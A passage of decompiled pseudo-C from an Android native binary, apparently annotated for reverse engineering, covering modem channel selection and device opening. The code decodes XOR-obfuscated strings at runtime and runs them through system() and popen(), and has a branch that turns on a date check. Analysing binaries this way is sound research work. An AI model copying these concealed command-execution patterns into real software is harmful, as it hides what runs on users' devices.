            FUN_0020c368(&local_30);
            uVar9 = FUN_001a4d04();
            if ((uVar9 & 1) == 0) {
              local_30 = 500000000;
              FUN_0020c368(&local_30);
              uVar9 = FUN_001a4d04();
              if ((uVar9 & 1) == 0) {
                local_30 = 500000000;
                FUN_0020c368(&local_30);
                uVar9 = FUN_001a4d04();
                if ((uVar9 & 1) == 0) {
                  local_30 = 500000000;
                  FUN_0020c368(&local_30);
                  uVar9 = FUN_001a4d04();
                  if ((uVar9 & 1) == 0) {
                    local_30 = 500000000;
                    FUN_0020c368(&local_30);
                    uVar9 = FUN_001a4d04();
                    if ((uVar9 & 1) == 0) {
                      local_30 = 500000000;
                      FUN_0020c368(&local_30);
                      uVar9 = FUN_001a4d04();
                      if ((uVar9 & 1) == 0) {
                        local_30 = 500000000;
                        FUN_0020c368(&local_30);
                        uVar9 = FUN_001a4d04();
                        if ((uVar9 & 1) == 0) {
                          local_30 = 500000000;
                          FUN_0020c368(&local_30);
                          uVar9 = FUN_001a4d04();
                          if ((uVar9 & 1) == 0) {
                            local_30 = 500000000;
                            FUN_0020c368(&local_30);
                            uVar9 = FUN_001a4d04();
                            if ((uVar9 & 1) == 0) {
                              local_30 = 500000000;
                              FUN_0020c368(&local_30);
                              uVar9 = FUN_001a4d04();
                              if ((uVar9 & 1) == 0) {
                                local_30 = 500000000;
                                FUN_0020c368(&local_30);
                                uVar6 = FUN_001a4d04();
                                if (*(long *)(lVar1 + 0x28) == local_28) goto LAB_001a5788;
                                goto LAB_001a5820;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    uVar6 = 1;
    if (*(long *)(lVar1 + 0x28) == local_28) {
LAB_001a5788:
      return uVar6 & 1;
    }
  }
LAB_001a5820:
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ----------------------------------------------------------------




// ============================================================================
// MODULE 3: Modem Channels & Device Discovery (اكتشاف وتهيئة قنوات المودم)
// ============================================================================


/*
 * [PHONE FUNCTION] FUN_001a33e0
 * Purpose (EN): Modem Channel Selector & SDK Version Router
 * Purpose (AR): تحديد القناة المناسبة حسب إصدار أندرويد SDK (<26, <30, >=30)
 */

// Function: FUN_001a33e0 @ 001a33e0
// ----------------------------------------------------------------

/* WARNING: Type propagation algorithm not settling */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

bool FUN_001a33e0(undefined8 param_1,long param_2)

{
  long lVar1;
  byte bVar2;
  byte bVar3;
  long lVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  bool bVar7;
  ulong *puVar8;
  byte *pbVar9;
  FILE *__stream;
  __ssize_t _Var10;
  size_t __n;
  void *__dest;
  char *pcVar11;
  undefined8 *puVar12;
  undefined1 *puVar13;
  uint uVar14;
  ulong uVar15;
  size_t local_158;
  char *local_150;
  ulong local_148;
  size_t local_140;
  void *local_138;
  ulong local_130;
  ulong uStack_128;
  void *local_120;
  byte local_118 [16];
  void *local_108;
  byte local_100;
  byte local_ff;
  undefined1 uStack_fe;
  undefined1 uStack_fd;
  undefined4 uStack_fc;
  undefined2 uStack_f8;
  undefined6 uStack_f6;
  char *local_f0;
  byte local_e8 [16];
  void *local_d8;
  byte local_d0 [16];
  void *local_c0;
  byte local_b8 [16];
  void *local_a8;
  byte local_a0 [16];
  void *local_90;
  byte local_88 [16];
  void *local_78;
  undefined6 local_70;
  undefined2 uStack_6a;
  undefined6 uStack_68;
  undefined2 uStack_62;
  void *local_60;
  long local_58;
  
  lVar4 = tpidr_el0;
  local_58 = *(long *)(lVar4 + 0x28);
  FUN_002036bc(local_e8);
  FUN_002036bc(local_d0,param_2 + 0x18);
  FUN_002036bc(local_b8,param_2 + 0x30);
  FUN_002036bc(local_a0,param_2 + 0x48);
  FUN_002036bc(local_88,param_2 + 0x60);
  FUN_001a3950(param_1);
  if ((local_88[0] & 1) != 0) {
    free(local_78);
  }
  if ((local_a0[0] & 1) != 0) {
    free(local_90);
  }
  if ((local_b8[0] & 1) != 0) {
    free(local_a8);
  }
  if ((local_d0[0] & 1) != 0) {
    free(local_c0);
  }
  if ((local_e8[0] & 1) != 0) {
    free(local_d8);
  }
  sleep(2);
  uStack_fd = 0;
  local_100 = 4;
  local_ff = 0x32;
  uStack_fe = 0x32;
  FUN_002036bc(local_118,&local_100);
  FUN_001b65e0(param_1,local_118,&local_100);
  if ((local_118[0] & 1) != 0) {
    free(local_108);
  }
  FUN_0019b934(&local_148,param_2 + 0x30,param_2 + 0x18);
  uVar15 = (ulong)(local_100 >> 1);
  pcVar11 = (char *)((ulong)&local_100 | 1);
  if ((local_100 & 1) != 0) {
    uVar15 = CONCAT62(uStack_f6,uStack_f8);
    pcVar11 = local_f0;
  }
  puVar8 = (ulong *)FUN_0020417c(&local_148,pcVar11,uVar15);
  uStack_128 = puVar8[1];
  local_130 = *puVar8;
  local_120 = (void *)puVar8[2];
  puVar8[1] = 0;
  puVar8[2] = 0;
  *puVar8 = 0;
  uVar15 = *(ulong *)(param_2 + 0x50);
  lVar1 = *(long *)(param_2 + 0x58);
  if ((*(byte *)(param_2 + 0x48) & 1) == 0) {
    lVar1 = param_2 + 0x49;
    uVar15 = (ulong)(*(byte *)(param_2 + 0x48) >> 1);
  }
  pbVar9 = (byte *)FUN_0020417c(&local_130,lVar1,uVar15);
  bVar2 = *pbVar9;
  bVar3 = pbVar9[1];
  local_70 = (undefined6)*(undefined8 *)(pbVar9 + 2);
  pcVar11 = *(char **)(pbVar9 + 0x10);
  uStack_6a = (undefined2)*(undefined8 *)(pbVar9 + 8);
  uStack_68 = (undefined6)((ulong)*(undefined8 *)(pbVar9 + 8) >> 0x10);
  pbVar9[0] = 0;
  pbVar9[1] = 0;
  pbVar9[2] = 0;
  pbVar9[3] = 0;
  pbVar9[4] = 0;
  pbVar9[5] = 0;
  pbVar9[6] = 0;
  pbVar9[7] = 0;
  pbVar9[8] = 0;
  pbVar9[9] = 0;
  pbVar9[10] = 0;
  pbVar9[0xb] = 0;
  pbVar9[0xc] = 0;
  pbVar9[0xd] = 0;
  pbVar9[0xe] = 0;
  pbVar9[0xf] = 0;
  pbVar9[0x10] = 0;
  pbVar9[0x11] = 0;
  pbVar9[0x12] = 0;
  pbVar9[0x13] = 0;
  pbVar9[0x14] = 0;
  pbVar9[0x15] = 0;
  pbVar9[0x16] = 0;
  pbVar9[0x17] = 0;
  if ((local_100 & 1) != 0) {
    free(local_f0);
  }
  uStack_fe = (undefined1)local_70;
  uStack_fd = (undefined1)((uint6)local_70 >> 8);
  uStack_fc = (undefined4)((uint6)local_70 >> 0x10);
  uStack_f8 = uStack_6a;
  uStack_f6 = uStack_68;
  local_100 = bVar2;
  local_ff = bVar3;
  local_f0 = pcVar11;
  if ((local_130 & 1) != 0) {
    free(local_120);
  }
  if ((local_148 & 1) != 0) {
    free(local_138);
  }
  pcVar11 = (char *)((ulong)&local_100 | 1);
  if ((local_100 & 1) != 0) {
    pcVar11 = local_f0;
  }
  __stream = popen(pcVar11,"r");
  if (__stream == (FILE *)0x0) {
    printf("\n\n  [+] Ril Error 1 \n\n");
    pbVar9 = (byte *)FUN_002295c4(&DAT_00234050);
    if ((*pbVar9 & 1) == 0) {
      puVar12 = (undefined8 *)FUN_002295c4(&DAT_00234030);
      uVar6 = _UNK_00176b68;
      uVar5 = _DAT_00176b60;
      *(undefined1 *)((long)puVar12 + 0x16) = 1;
      *(undefined4 *)(puVar12 + 2) = 0xf9c975b7;
      puVar12[1] = uVar6;
      *puVar12 = uVar5;
      *(undefined2 *)((long)puVar12 + 0x14) = 0xbfa2;
      FUN_002234c0(&LAB_001a900c,puVar12,0x2362d0);
      puVar13 = (undefined1 *)FUN_002295c4(&DAT_00234050);
      *puVar13 = 1;
    }
    pcVar11 = (char *)FUN_002295c4(&DAT_00234030);
    FUN_001b5930();
    system(pcVar11);
    puts("RIL Exit");
    bVar7 = false;
  }
  else {
    local_130 = local_130 & 0xffffffffffff0000;
    local_158 = 0;
    local_150 = (char *)0x0;
    _Var10 = getline(&local_150,&local_158,__stream);
    if (_Var10 == -1) {
      uVar14 = 0;
    }
    else {
      do {
        pcVar11 = local_150;
        __n = strlen(local_150);
        if (0xffffffffffffffef < __n) {
                    /* WARNING: Subroutine does not return */
          FUN_00203188(&local_148);
        }
        if (__n < 0x17) {
          local_148 = CONCAT71(local_148._1_7_,(char)((int)__n << 1));
          __dest = (void *)((ulong)&local_148 | 1);
          if (__n != 0) goto LAB_001a366c;
        }
        else {
          uVar15 = __n + 0x10 & 0xfffffffffffffff0;
          __dest = (void *)FUN_00202bc0(uVar15);
          local_148 = uVar15 | 1;
          local_140 = __n;
          local_138 = __dest;
LAB_001a366c:
          memcpy(__dest,pcVar11,__n);
        }
        *(undefined1 *)((long)__dest + __n) = 0;
        FUN_0019b934(&local_70,&local_130,&local_148);
        if ((local_130 & 1) == 0) {
          uStack_128 = CONCAT26(uStack_62,uStack_68);
          local_130 = CONCAT26(uStack_6a,local_70);
          local_120 = local_60;
        }
        else {
          free(local_120);
          uStack_128 = CONCAT26(uStack_62,uStack_68);
          local_130 = CONCAT26(uStack_6a,local_70);
          local_120 = local_60;
        }
        local_60 = local_120;
        if ((local_148 & 1) != 0) {
          free(local_138);
        }
        _Var10 = getline(&local_150,&local_158,__stream);
      } while (_Var10 != -1);
      uVar14 = (uint)(byte)local_130;
    }
    uVar15 = (ulong)(uVar14 >> 1);
    if ((uVar14 & 1) != 0) {
      uVar15 = uStack_128;
    }
    bVar7 = uVar15 != 0;
    if ((uVar14 & 1) != 0) {
      free(local_120);
    }
  }
  if ((local_100 & 1) == 0) {
    if (*(long *)(lVar4 + 0x28) != local_58) {
LAB_001a3804:
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  }
  else {
    free(local_f0);
    if (*(long *)(lVar4 + 0x28) != local_58) goto LAB_001a3804;
  }
  return bVar7;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a3950
 * Purpose (EN): Modem Device Opener & TTY Configurator
 * Purpose (AR): فتح قنوات /dev/umts_* و /dev/smd* وضبط إعدادات termios
 */

// Function: FUN_001a3950 @ 001a3950
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001a3950(void)

{
  char cVar1;
  long lVar2;
  uint uVar3;
  uint uVar4;
  bool bVar5;
  bool bVar6;
  int iVar7;
  byte *pbVar8;
  char *pcVar9;
  long lVar10;
  undefined8 *puVar11;
  undefined8 uVar12;
  ulong uVar13;
  undefined4 *puVar14;
  void *__dest;
  undefined1 *puVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  byte bVar26;
  byte bVar27;
  byte bVar28;
  byte bVar29;
  byte bVar30;
  byte bVar31;
  undefined8 uVar32;
  undefined8 uVar33;
  undefined8 uVar34;
  undefined8 uVar35;
  undefined8 uVar36;
  undefined8 uVar37;
  undefined8 uVar38;
  undefined8 uVar39;
  undefined8 uVar40;
  undefined8 uVar41;
  undefined8 uVar42;
  undefined8 uVar43;
  undefined8 uVar44;
  pthread_t pStack_118;
  undefined8 local_110;
  undefined8 local_108;
  void *local_100;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined8 uStack_e8;
  undefined8 local_e0;
  undefined8 uStack_d8;
  undefined8 uStack_d0;
  undefined8 uStack_c8;
  undefined8 local_c0;
  undefined8 uStack_b8;
  undefined8 uStack_b0;
  undefined4 uStack_a8;
  undefined4 local_a4;
  undefined4 uStack_a0;
  undefined8 uStack_9c;
  char acStack_94 [92];
  long local_38;
  
  lVar2 = tpidr_el0;
  local_38 = *(long *)(lVar2 + 0x28);
  pbVar8 = (byte *)FUN_002295c4(&DAT_002348d0);
  if ((*pbVar8 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_002348b0);
    FUN_001ab97c(uVar12,&DAT_00178d33);
    FUN_002234c0(&LAB_001aba98,uVar12,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_002348d0);
    *puVar15 = 1;
  }
  pcVar9 = (char *)FUN_002295c4(&DAT_002348b0);
  FUN_001b5c48();
  system(pcVar9);
  pbVar8 = (byte *)FUN_002295c4(&DAT_00234910);
  if ((*pbVar8 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_002348f0);
    FUN_001abaa8(uVar12,&DAT_00178d55);
    FUN_002234c0(&LAB_001abbcc,uVar12,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_00234910);
    *puVar15 = 1;
  }
  pcVar9 = (char *)FUN_002295c4(&DAT_002348f0);
  FUN_001b5c90();
  system(pcVar9);
  pbVar8 = (byte *)FUN_002295c4(&DAT_00234950);
  if ((*pbVar8 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_00234930);
    FUN_001abbdc(uVar12,&DAT_00178d78);
    FUN_002234c0(&LAB_001abd00,uVar12,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_00234950);
    *puVar15 = 1;
  }
  pcVar9 = (char *)FUN_002295c4(&DAT_00234930);
  FUN_001b5ce8();
  system(pcVar9);
  pbVar8 = (byte *)FUN_002295c4(&DAT_00234990);
  if ((*pbVar8 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_00234970);
    FUN_001abd10(uVar12,&DAT_00178d9b);
    FUN_002234c0(&LAB_001abf14,uVar12,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_00234990);
    *puVar15 = 1;
    lVar10 = FUN_002295c4(&DAT_00234970);
    cVar1 = *(char *)(lVar10 + 0x3f);
  }
  else {
    lVar10 = FUN_002295c4(&DAT_00234970);
    cVar1 = *(char *)(lVar10 + 0x3f);
  }
  if (cVar1 != '\0') {
    puVar11 = (undefined8 *)FUN_002295c4(&DAT_00234970);
    uVar34 = _UNK_00177588;
    uVar12 = _DAT_00177580;
    *(byte *)(puVar11 + 6) = *(byte *)(puVar11 + 6) ^ 0x8f;
    *(byte *)((long)puVar11 + 0x31) = ~*(byte *)((long)puVar11 + 0x31);
    *(byte *)((long)puVar11 + 0x32) = *(byte *)((long)puVar11 + 0x32) ^ 0x89;
    *(byte *)((long)puVar11 + 0x34) = *(byte *)((long)puVar11 + 0x34) ^ 0xfd;
    *(byte *)((long)puVar11 + 0x33) = *(byte *)((long)puVar11 + 0x33) ^ 5;
    *(byte *)((long)puVar11 + 0x35) = *(byte *)((long)puVar11 + 0x35) ^ 0xb;
    *(undefined1 *)((long)puVar11 + 0x3f) = 0;
    *(byte *)((long)puVar11 + 0x36) = *(byte *)((long)puVar11 + 0x36) ^ 0x35;
    uVar33 = puVar11[1];
    uVar32 = *puVar11;
    uVar36 = puVar11[3];
    uVar35 = puVar11[2];
    *(byte *)((long)puVar11 + 0x37) = *(byte *)((long)puVar11 + 0x37) ^ 0xb9;
    *(byte *)(puVar11 + 7) = *(byte *)(puVar11 + 7) ^ 0x8f;
    *(byte *)((long)puVar11 + 0x39) = ~*(byte *)((long)puVar11 + 0x39);
    *(byte *)((long)puVar11 + 0x3a) = *(byte *)((long)puVar11 + 0x3a) ^ 0x89;
    uVar38 = puVar11[5];
    uVar37 = puVar11[4];
    bVar16 = (byte)uVar12;
    bVar17 = (byte)((ulong)uVar12 >> 8);
    bVar18 = (byte)((ulong)uVar12 >> 0x10);
    bVar19 = (byte)((ulong)uVar12 >> 0x18);
    bVar20 = (byte)((ulong)uVar12 >> 0x20);
    bVar21 = (byte)((ulong)uVar12 >> 0x28);
    bVar22 = (byte)((ulong)uVar12 >> 0x30);
    bVar23 = (byte)((ulong)uVar12 >> 0x38);
    bVar24 = (byte)uVar34;
    bVar25 = (byte)((ulong)uVar34 >> 8);
    bVar26 = (byte)((ulong)uVar34 >> 0x10);
    bVar27 = (byte)((ulong)uVar34 >> 0x18);
    bVar28 = (byte)((ulong)uVar34 >> 0x20);
    bVar29 = (byte)((ulong)uVar34 >> 0x28);
    bVar30 = (byte)((ulong)uVar34 >> 0x30);
    bVar31 = (byte)((ulong)uVar34 >> 0x38);
    *(byte *)((long)puVar11 + 0x3b) = *(byte *)((long)puVar11 + 0x3b) ^ 5;
    *(byte *)((long)puVar11 + 0x3c) = *(byte *)((long)puVar11 + 0x3c) ^ 0xfd;
    *(byte *)((long)puVar11 + 0x3d) = *(byte *)((long)puVar11 + 0x3d) ^ 0xb;
    puVar11[1] = CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar31,
                          CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar30,
                                   CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar29,
                                            CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar28,
                                                     CONCAT13((byte)((ulong)uVar33 >> 0x18) ^ bVar27
                                                              ,CONCAT12((byte)((ulong)uVar33 >> 0x10
                                                                              ) ^ bVar26,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar33 >> 8) ^ bVar25,(byte)uVar33 ^ bVar24)))))))
    ;
    *puVar11 = CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar23,
                        CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar22,
                                 CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar21,
                                          CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar20,
                                                   CONCAT13((byte)((ulong)uVar32 >> 0x18) ^ bVar19,
                                                            CONCAT12((byte)((ulong)uVar32 >> 0x10) ^
                                                                     bVar18,CONCAT11((byte)((ulong)
                                                  uVar32 >> 8) ^ bVar17,(byte)uVar32 ^ bVar16)))))))
    ;
    puVar11[3] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar31,
                          CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar30,
                                   CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar29,
                                            CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar28,
                                                     CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar27
                                                              ,CONCAT12((byte)((ulong)uVar36 >> 0x10
                                                                              ) ^ bVar26,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar25,(byte)uVar36 ^ bVar24)))))))
    ;
    puVar11[2] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar23,
                          CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar22,
                                   CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar21,
                                            CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar20,
                                                     CONCAT13((byte)((ulong)uVar35 >> 0x18) ^ bVar19
                                                              ,CONCAT12((byte)((ulong)uVar35 >> 0x10
                                                                              ) ^ bVar18,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar35 >> 8) ^ bVar17,(byte)uVar35 ^ bVar16)))))))
    ;
    puVar11[5] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar31,
                          CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar30,
                                   CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar29,
                                            CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar28,
                                                     CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar27
                                                              ,CONCAT12((byte)((ulong)uVar38 >> 0x10
                                                                              ) ^ bVar26,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar25,(byte)uVar38 ^ bVar24)))))))
    ;
    puVar11[4] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar23,
                          CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar22,
                                   CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar21,
                                            CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar20,
                                                     CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar19
                                                              ,CONCAT12((byte)((ulong)uVar37 >> 0x10
                                                                              ) ^ bVar18,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar17,(byte)uVar37 ^ bVar16)))))))
    ;
    *(byte *)((long)puVar11 + 0x3e) = *(byte *)((long)puVar11 + 0x3e) ^ 0x35;
  }
  pcVar9 = (char *)FUN_002295c4(&DAT_00234970);
  system(pcVar9);
  pbVar8 = (byte *)FUN_002295c4(&DAT_002349d0);
  if ((*pbVar8 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_002349b0);
    FUN_001abf28(uVar12,&DAT_00178dda);
    FUN_002234c0(&LAB_001abffc,uVar12,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_002349d0);
    *puVar15 = 1;
  }
  uVar12 = FUN_002295c4(&DAT_002349b0);
  FUN_001b5d3c();
  __system_property_get(uVar12,acStack_94);
  pbVar8 = (byte *)FUN_002295c4(&DAT_00234a10);
  if ((*pbVar8 & 1) == 0) {
    puVar14 = (undefined4 *)FUN_002295c4(&DAT_002349f0);
    *puVar14 = 0x15789c0;
    FUN_002234c0(&LAB_001ac00c,puVar14,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_00234a10);
    *puVar15 = 1;
    lVar10 = FUN_002295c4(&DAT_002349f0);
    cVar1 = *(char *)(lVar10 + 3);
  }
  else {
    lVar10 = FUN_002295c4(&DAT_002349f0);
    cVar1 = *(char *)(lVar10 + 3);
  }
  if (cVar1 != '\0') {
    pbVar8 = (byte *)FUN_002295c4(&DAT_002349f0);
    pbVar8[3] = 0;
    *pbVar8 = *pbVar8 ^ 0xf1;
    pbVar8[1] = pbVar8[1] ^ 0xbf;
    pbVar8[2] = pbVar8[2] ^ 0x57;
  }
  pcVar9 = (char *)FUN_002295c4(&DAT_002349f0);
  iVar7 = strcmp(acStack_94,pcVar9);
  uVar13 = FUN_001a4d04();
  if ((iVar7 == 0) || ((uVar13 & 1) != 0)) goto LAB_001a4180;
  pbVar8 = (byte *)FUN_002295c4(&DAT_00234ad0);
  if ((*pbVar8 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_00234ab0);
    FUN_001ac394(uVar12,&DAT_00178e38);
    FUN_002234c0(&LAB_001ac4b8,uVar12,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_00234ad0);
    *puVar15 = 1;
  }
  uVar12 = FUN_002295c4(&DAT_00234ab0);
  FUN_001b5d84();
  uVar13 = FUN_001a50c4(uVar12);
  if ((uVar13 & 1) != 0) {
    local_f0 = 1000000000;
    FUN_0020c368(&local_f0);
    iVar7 = 0xe;
    do {
      FUN_0019d9ec();
      local_f0 = 250000000;
      FUN_0020c368(&local_f0);
      uVar13 = FUN_001a4d04();
      if ((uVar13 & 1) != 0) break;
      bVar5 = iVar7 != 0;
      iVar7 = iVar7 + -1;
    } while (bVar5);
    uVar13 = FUN_001a4d04();
    if ((uVar13 & 1) != 0) goto LAB_001a4180;
  }
  uStack_9c = 0;
  uStack_a0 = 0;
  uStack_b8 = 0;
  local_c0 = 0;
  uStack_a8 = 0;
  local_a4 = 0;
  uStack_b0 = 0;
  uStack_d8 = 0;
  local_e0 = 0;
  uStack_c8 = 0;
  uStack_d0 = 0;
  uStack_e8 = 0;
  local_f0 = 0;
  pbVar8 = (byte *)FUN_002295c4(&DAT_00234b10);
  if ((*pbVar8 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_00234af0);
    FUN_001ac4c8(uVar12,&DAT_00178e5b);
    FUN_002234c0(&LAB_001ac5d4,uVar12,0x2362d0);
    puVar15 = (undefined1 *)FUN_002295c4(&DAT_00234b10);
    *puVar15 = 1;
  }
  uVar12 = FUN_002295c4(&DAT_00234af0);
  FUN_001b5ddc();
  __system_property_get(uVar12,&local_f0);
  local_108 = (ulong)local_108._4_4_ << 0x20;
  local_110 = 0;
  iVar7 = sscanf((char *)&local_f0,"%d-%d-%d",&local_110,(ulong)&local_110 | 4,&local_108);
  uVar3 = (uint)local_110;
  if ((int)(uint)local_110 < 0x7d1) {
    uVar13 = FUN_001a55a8(iVar7);
    if ((uVar13 & 1) != 0) goto LAB_001a4180;
    goto LAB_001a4144;
  }
  uVar4 = local_110._4_4_;
  bVar5 = 0xb < local_110._4_4_ - 1;
  bVar6 = 0x1e < (int)local_108 - 1U;
  if (((!bVar5 && !bVar6) && ((uint)local_110 == 0x7e8)) && (local_110._4_4_ - 5 < 5)) {
    FUN_001a4504();
    FUN_001a483c();
    local_110 = 0;
    local_108 = 0;
    local_100 = (void *)0x0;
    pbVar8 = (byte *)FUN_002295c4(&DAT_00234b50);
    if ((*pbVar8 & 1) == 0) {
      __dest = (void *)FUN_002295c4(&DAT_00234b30);
      *(undefined1 *)((long)__dest + 0x1ad) = 1;
      memcpy(__dest,&DAT_00178e7b,0x1ad);
      FUN_002234c0(&LAB_001ac5e0,__dest,0x2362d0);
      puVar15 = (undefined1 *)FUN_002295c4(&DAT_00234b50);
      *puVar15 = 1;
      lVar10 = FUN_002295c4(&DAT_00234b30);
      cVar1 = *(char *)(lVar10 + 0x1ad);
    }
    else {
      lVar10 = FUN_002295c4(&DAT_00234b30);
      cVar1 = *(char *)(lVar10 + 0x1ad);
    }
    if (cVar1 != '\0') {
      puVar11 = (undefined8 *)FUN_002295c4(&DAT_00234b30);
      uVar34 = puVar11[1];
      uVar12 = *puVar11;
      uVar33 = puVar11[3];
      uVar32 = puVar11[2];
      *(undefined1 *)((long)puVar11 + 0x1ad) = 0;
      uVar36 = puVar11[5];
      uVar35 = puVar11[4];
      uVar38 = puVar11[7];
      uVar37 = puVar11[6];
      bVar16 = (byte)_DAT_001772d0;
      bVar17 = (byte)((ulong)_DAT_001772d0 >> 8);
      bVar18 = (byte)((ulong)_DAT_001772d0 >> 0x10);
      bVar19 = (byte)((ulong)_DAT_001772d0 >> 0x18);
      bVar20 = (byte)((ulong)_DAT_001772d0 >> 0x20);
      bVar21 = (byte)((ulong)_DAT_001772d0 >> 0x28);
      bVar22 = (byte)((ulong)_DAT_001772d0 >> 0x30);
      bVar23 = (byte)((ulong)_DAT_001772d0 >> 0x38);
      bVar24 = (byte)_UNK_001772d8;
      bVar25 = (byte)((ulong)_UNK_001772d8 >> 8);
      bVar26 = (byte)((ulong)_UNK_001772d8 >> 0x10);
      bVar27 = (byte)((ulong)_UNK_001772d8 >> 0x18);
      bVar28 = (byte)((ulong)_UNK_001772d8 >> 0x20);
      bVar29 = (byte)((ulong)_UNK_001772d8 >> 0x28);
      bVar30 = (byte)((ulong)_UNK_001772d8 >> 0x30);
      bVar31 = (byte)((ulong)_UNK_001772d8 >> 0x38);
      uVar40 = puVar11[9];
      uVar39 = puVar11[8];
      uVar42 = puVar11[0xb];
      uVar41 = puVar11[10];
      puVar11[1] = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar31,
                            CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar30,
                                     CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar29,
                                              CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar28,
                                                       CONCAT13((byte)((ulong)uVar34 >> 0x18) ^
                                                                bVar27,CONCAT12((byte)((ulong)uVar34
                                                                                      >> 0x10) ^
                                                                                bVar26,CONCAT11((
                                                  byte)((ulong)uVar34 >> 8) ^ bVar25,
                                                  (byte)uVar34 ^ bVar24)))))));
      *puVar11 = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar23,
                          CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar22,
                                   CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                            CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar20,
                                                     CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar19
                                                              ,CONCAT12((byte)((ulong)uVar12 >> 0x10
                                                                              ) ^ bVar18,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar17,(byte)uVar12 ^ bVar16)))))))
      ;
      puVar11[3] = CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar31,
                            CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar30,
                                     CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar29,
                                              CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar28,
                                                       CONCAT13((byte)((ulong)uVar33 >> 0x18) ^
                                                                bVar27,CONCAT12((byte)((ulong)uVar33
                                                                                      >> 0x10) ^
                                                                                bVar26,CONCAT11((
                                                  byte)((ulong)uVar33 >> 8) ^ bVar25,
                                                  (byte)uVar33 ^ bVar24)))))));
      puVar11[2] = CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar23,
                            CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar22,
                                     CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar21,
                                              CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar20,
                                                       CONCAT13((byte)((ulong)uVar32 >> 0x18) ^
                                                                bVar19,CONCAT12((byte)((ulong)uVar32
                                                                                      >> 0x10) ^
                                                                                bVar18,CONCAT11((
                                                  byte)((ulong)uVar32 >> 8) ^ bVar17,
                                                  (byte)uVar32 ^ bVar16)))))));
      uVar44 = puVar11[0xd];
      uVar43 = puVar11[0xc];
      uVar34 = puVar11[0xf];
      uVar12 = puVar11[0xe];
      puVar11[5] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar31,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar30,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar29,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar28,
